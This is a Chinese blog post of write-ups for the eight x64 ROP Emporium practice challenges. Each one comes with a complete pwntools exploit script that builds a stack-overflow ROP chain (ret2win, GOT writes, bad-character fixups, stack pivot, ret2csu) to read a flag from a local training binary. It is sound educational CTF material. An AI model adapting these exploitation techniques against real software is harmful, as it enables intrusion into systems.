---
layout: post
title: "ropemporium题解"
tags: [blog]
author: wqpw
---

[https://ropemporium.com/](https://ropemporium.com/) 上八个通过栈溢出以及构造ROP链获取flag的PWN题的题解，题目最后更新于2020年7月。**这里只做了x64的题**，其他的以后有空再看。
每个题解法不唯一，最后三个题比较有趣。

## 0-ret2win

将`pwnme`的返回地址覆盖为`ret2win`的地址即可。

```python
from pwn import *
p = process('./ret2win')
elf = ELF('./ret2win')
padding = b'a'*40
ret2win = p64(elf.symbols['ret2win'])
payload = padding + ret2win
p.recvuntil('>')
p.sendline(payload)
p.interactive()
```

## 1-split

自带了system和cat flag，通过rop调用即可。

```python
from pwn import *
p = process('./split')
elf = ELF('./split')

padding = b'a'*40
usefulstr = p64(elf.symbols['usefulString'])
system_addr = p64(elf.symbols['system'])
pop_rdi_ret = p64(0x4007c3)
_ret = p64(0x40053e)
payload = padding+pop_rdi_ret+usefulstr+_ret+system_addr

p.recvuntil('>')
p.sendline(payload)
p.interactive()
```

## 2-callme

简单逆向得知，利用自带的usefulGadgets设置参数然后按序调用三个函数即可。

```python
from pwn import *
p = process('./callme')
elf = ELF('./callme')

padding = b'a'*40
useful_gadgets = p64(elf.symbols['usefulGadgets'])
p1 = p64(0xdeadbeefdeadbeef)
p2 = p64(0xcafebabecafebabe)
p3 = p64(0xd00df00dd00df00d)
set_p = useful_gadgets+p1+p2+p3
f1 = p64(elf.symbols['callme_one'])
f2 = p64(elf.symbols['callme_two'])
f3 = p64(elf.symbols['callme_three'])
payload = padding+set_p+f1+set_p+f2+set_p+f3
p.recvuntil('>')
p.sendline(payload)
p.interactive
```

## 3-write4

利用usefulGadgets将flag.txt写入got表，然后调用print_file读取flag。

```python
from pwn import *
p = process('./write4')
elf = ELF('./write4')

padding = b'a'*40
pop_rdi_ret = p64(0x400693)
pop_r14_pop_r15_ret = p64(0x400690)
useful_gadget = p64(elf.symbols['usefulGadgets']) # mov QWORD PTR [r14],r15; ret
print_file_addr = p64(elf.symbols['print_file'])
flag = p64(u64(b'flag.txt')) # --> r15
pwnme_addr = elf.got['pwnme']+16
printfile_got = elf.got['print_file']

payload = padding+pop_r14_pop_r15_ret+p64(pwnme_addr)+flag+useful_gadget
payload += pop_rdi_ret+p64(pwnme_addr)+print_file_addr
p.recvuntil('>')

p.sendline(payload)
p.interactive()
```

## 4-badchars

逆向发现`agx.`会被换掉，所以通过rop重新算回来就行。

```python
from pwn import *
p = process('./badchars')
elf = ELF('./badchars')

print_file_plt       = p64(elf.plt['print_file'])
pwnme_got            = elf.got['pwnme']+24 #+16 +6 will have '.'
xor_Pr15_r14b_ret    = p64(0x400628)
#xor_Prdi_d_ret       = p64(0x400629)
add_Pr15_r14b_ret    = p64(0x40062c)
#add_Prdi_d_ret       = p64(0x40062d)
sub_Pr15_r14b_ret    = p64(0x400630) # sub [r15], r14b; ret;
#sub_Prdi_d_ret       = p64(0x400631)
mov_Pr13_r12_ret     = p64(0x400634) # mov qword ptr [r13],r12
pop_r14_pop_r15_ret  = p64(0x4006a0)
pop_r15_ret          = p64(0x4006a2)
pop_rdi_ret          = p64(0x4006a3)
flag                 = p64(u64(b'flag.txt'))
pop_r12r13r14r15_ret = p64(0x40069c)
padding              = b'a'*40

# let r15 point to got.pwnme
payload  = padding+pop_r15_ret+p64(pwnme_got)

# let [r15] = fl\xeb\xeb\xebt\ebt
payload += pop_r12r13r14r15_ret+flag+p64(pwnme_got)+p64(0)+p64(pwnme_got)
payload += mov_Pr13_r12_ret

# let [r15] = flag.txt\00
payload += pop_r14_pop_r15_ret+p64(138)+p64(pwnme_got+2)+sub_Pr15_r14b_ret #a
payload += pop_r14_pop_r15_ret+p64(132)+p64(pwnme_got+3)+sub_Pr15_r14b_ret #g
payload += pop_r14_pop_r15_ret+p64(189)+p64(pwnme_got+4)+sub_Pr15_r14b_ret #.
payload += pop_r14_pop_r15_ret+p64(115)+p64(pwnme_got+6)+sub_Pr15_r14b_ret #x
print(pop_r14_pop_r15_ret+p64(115)+p64(pwnme_got+6)+sub_Pr15_r14b_ret)
payload += pop_r12r13r14r15_ret+p64(0)+p64(pwnme_got+8)+p64(0)+p64(pwnme_got)
payload += mov_Pr13_r12_ret

# then let rdi <- got.pwnme and call print_file(rdi)
payload += pop_rdi_ret+p64(pwnme_got)+print_file_plt

p.recvuntil('>')
#gdb.attach(p)
p.sendline(payload)
p.interactive()

```

## 5-fluff

```asm
0000000000400628 <questionableGadgets>:
  400628:       d7                      xlat   BYTE PTR ds:[rbx]
  400629:       c3                      ret    
  40062a:       5a                      pop    rdx
  40062b:       59                      pop    rcx
  40062c:       48 81 c1 f2 3e 00 00    add    rcx,0x3ef2
  400633:       c4 e2 e8 f7 d9          bextr  rbx,rcx,rdx
  400638:       c3                      ret    
  400639:       aa                      stos   BYTE PTR es:[rdi],al
  40063a:       c3                      ret 
```

`XLAT` 字节查表转换.  
`BX`指向一张256字节的表的起点, `AL`为表的索引值(0-255,即0-FFH); 返回AL为查表结果. (`*(BX+AL)->AL`)  

bextr rbx,rcx,rdx  
按照`rdx`指定的索引值与长度值，从`rcx`中截取比特位，结果保存在`rbx`中, 原`rbx`清空。`rdx`的第7:0位指定了位提取的起始位。  
超过Operand Size的START值将不会从`rdx`中提取任何位。`rdx`的第15:8位指定了从START位置开始提取的最大位数（LENGTH）。
最大位数不超过OperandSize-1，length为0则清空`rbx`.

`stosb,stosw,stosd`这三个指令把`al/ ax/ eax`的内容存储到`rdi`指向的内存单元中，同时`edi`的值根据方向标志的值增加或者减少


测试：

```c
#include <stdio.h>
int main()
{
    asm("mov $0b11011111101010010,%rcx");
    asm("mov $0b000101000000000,%rdx"); //start 0. len 0b1010 == 10
    asm("bextr %rdx,%rcx,%rbx"); //rbx == 0b1101010010 == 850 == 0x352 !!!
    return 0;
}
```

Exp:

```python
from pwn import *
p = process('./fluff')
elf = ELF('./fluff')
content = open('fluff', 'rb').read()
of = list(map(lambda x:ord(x), '\x0bflag.tx'))
flag = b'flag.txt'
padding = b'a'*40
pop_rdi_ret = p64(0x4006a3)

# pop rdx; pop rcx;add rcx,0x3ef2;bextr rbx,rcx,rdx; ret
# 0x3ef2
# put "Thank you!\n" --> rax = 0xb, al = 0xb == 11
bextr_ret = p64(0x40062a)
# xlat BYTE PTR ds:[rbx]; rbx point to the start of a table of 256 BYTE
# then we need rbx[al] == 0x66 == hexdump+grep+gdb find ((char*)0x4003bd)[11]
xlat_ret = p64(0x400628)
# now al == 0x66. then we need rbx[al] == 0x6c ......
# stosb byte ptr [rdi], al; ret; rdi will +=1
stosb_ret = p64(0x400639)

print_file = p64(elf.symbols['print_file'])
#flag = p64(u64(b'flag.txt'))
#0x66 0x6c 0x61 0x67 0x2e 0x74 0x78 0x74
dest_addr = p64(elf.got['pwnme']+16) # rdi point to here

payload = padding + pop_rdi_ret + dest_addr

# 'f' 0x66 --> [rdi++] ᕕ( ᐛ )ᕗ
# payload += bextr_ret + p64(0b1011100000000) + p64(0x4003bd-0x3ef2)
# payload += xlat_ret + stosb_ret

# shell version like this: 
# hexdump -e '/1 "%_ad %_p\n"' fluff | grep f | head -n1 | awk '{printf("0x%x",$1+0x400000-0x3ef2)}'

for i in range(0, len(of)):
    rcx = content.index(flag[i])+0x400000-0x3ef2-of[i]
    rdx = p64(int(bin(64)+'0'*8,2)) # copy all bits of rcx to rbx
    payload += bextr_ret + rdx + p64(rcx) + xlat_ret + stosb_ret

payload += pop_rdi_ret + dest_addr + print_file
#print(len(payload))
#exit(0)

p.recvuntil('>')
#gdb.attach(p)
p.sendline(payload)
p.interactive()
```

## 6-pivot

将栈移动到前面分配的堆空间上，利用rax相关的gadgets计算出ret2win的地址，跳转过去得到flag。

```python
from pwn import *
#context.log_level = 'debug'
p = process('./pivot')
elf = ELF('./pivot')
lib = ELF('./libpivot.so')

padding = b'a'*40
pop_rax_ret = p64(0x4009bb)
pop_rdi_ret = p64(0x400a33)
xchg_ret = p64(0x4009bd) # xchg_rax_rsp_ret
pop_rbp_ret = p64(0x4007c8)
add_rax_rbp_ret = p64(0x4009c4)
jmp_rax = p64(0x4007c1)
mov_rax_prax_ret = p64(0x4009c0) # mov rax, qword ptr [rax]; ret;
offset = p64(lib.symbols['ret2win'] - lib.symbols['foothold_function'])

puts_plt = p64(elf.symbols['puts'])
pwnme_plt = p64(elf.symbols['pwnme'])
foothold_function_got = p64(elf.got['foothold_function'])
foothold_function_plt = p64(elf.plt['foothold_function'])

# stack pivot ᕕ( ᐛ )ᕗ
pos = p.recvuntil('Send')
pos = p64(int(pos[pos.index(b'0x'):-5],16))
stack_pivot = padding + pop_rax_ret + pos + xchg_ret

# jmp to ret2win then get flag
rop_chain = foothold_function_plt
rop_chain += pop_rax_ret + foothold_function_got
rop_chain += mov_rax_prax_ret + pop_rbp_ret + offset + add_rax_rbp_ret
rop_chain += jmp_rax

p.recvuntil('>')
p.sendline(rop_chain)
p.recvuntil('>')
p.sendline(stack_pivot)
p.interactive()
```

## 7-ret2csu

参考资料：[asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf)

关键是找到一个函数指针，在`call QWORD PTR [r12+rbx*8]`之后`rdx,rsi,rdi`的值不变，可以看这篇[博客](http://www.qfrost.com/CTF/%E4%B8%87%E8%83%BDgadget/).

```python
from pwn import *
#context.log_level='DEBUG'
p = process('./ret2csu')
elf = ELF('./ret2csu')

pop_rdi_ret = p64(0x4006a3)
pop_rsi_r15_ret = p64(0x4006a1)

'''
  40069a: 5b                    pop    rbx
  40069b: 5d                    pop    rbp
  40069c: 41 5c                 pop    r12
  40069e: 41 5d                 pop    r13
  4006a0: 41 5e                 pop    r14
  4006a2: 41 5f                 pop    r15
  4006a4: c3                    ret
'''
gadget1 = p64(0x40069a)

'''
  400680: 4c 89 fa              mov    rdx,r15
  400683: 4c 89 f6              mov    rsi,r14
  400686: 44 89 ef              mov    edi,r13d
  400689: 41 ff 14 dc           call   QWORD PTR [r12+rbx*8]
''' #call (%r12+(%rbx*8)) == ret2win@plt == 0x400510.
gadget2 = p64(0x400680)
call_r12 = p64(0x400689)

# __init_array_start --> frame_dummy -> register_tm_clones
# http://www.qfrost.com/CTF/%E4%B8%87%E8%83%BDgadget/

test_addr = p64(0x600df0)

ret2win_addr = p64(elf.symbols['ret2win'])

padding = b'a'*40
p1 = p64(0xdeadbeefdeadbeef) #rdi
p2 = p64(0xcafebabecafebabe) #rsi
p3 = p64(0xd00df00dd00df00d) #rdx

payload  = padding + gadget1
payload += p64(0) + p64(1) + test_addr
payload += p64(0) + p64(0) + p3
payload += gadget2 # call test
'''
0x40068d add    rbx,0x1
         cmp    rbp,rbx 
         jne    ......
         add    rsp, 0x8
'''
payload += p64(0)
payload += p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0)
payload += pop_rdi_ret + p1 + pop_rsi_r15_ret + p2 + p64(0)
payload += ret2win_addr

#gdb.attach(p)

p.recvuntil('>')
p.sendline(payload)
print(p.recv())
p.interactive()

#x/20i 0x40068a
#0x40068a <__libc_csu_init+74>:       call   QWORD PTR [rsp+rbx*8]
```
